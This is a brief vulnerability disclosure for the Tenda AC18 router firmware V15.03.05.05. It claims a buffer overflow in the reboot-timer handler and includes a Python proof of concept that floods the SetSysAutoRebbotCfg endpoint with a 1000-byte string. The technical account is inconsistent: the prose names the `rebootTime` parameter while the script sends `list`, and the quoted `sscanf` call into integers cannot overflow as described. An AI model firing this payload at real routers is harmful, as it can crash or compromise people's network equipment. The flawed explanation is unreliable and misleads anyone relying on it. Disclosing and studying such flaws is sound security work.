## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a buffer overflow vulnerability in the `formsetreboottimer ` function. The `s` variable receives the `rebootTime` parameter from a POST request and is later passed to the `sscanf` function. However, since the Since user can control the input of  `rebootTime`, the statemeant `sscanf(s, "%d:%d", &v7, &v6);` can cause a buffer overflow.

![image-20250603000248091](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250603000248091.png)

## POC

```python
import requests

ip = "192.168.1.1"

url = f'http://{ip}/goform/SetSysAutoRebbotCfg'
payload = b'a' * 1000
data = {
    'list':payload
}

requests.post(url, data=data)
```

![image-20250603000202009](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250603000202009.png)
